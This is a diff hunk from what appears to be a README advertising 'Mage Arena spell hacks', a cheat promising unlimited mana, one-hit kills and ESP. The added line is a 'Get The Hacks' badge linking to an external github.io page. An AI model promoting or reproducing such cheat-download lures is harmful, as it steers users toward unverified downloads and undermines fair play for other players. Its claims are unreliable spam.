@@ -4,7 +4,7 @@
 
 Mage Arena is all about spellcasting and fast-paced duels. But sometimes, even the strongest wizard needs a little boost. The **Mage Arena spell hacks** give you total control of your magic—unlimited mana, instant-cast spells, one-hit kills, and ESP awareness. With these hacks, you’ll crush opponents, outplay rivals, and turn every duel into a magical showcase.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Hacks-blueviolet)](https://mage-arena-spell-hacks.github.io/.github/)
 ---
 
 ## Product Description
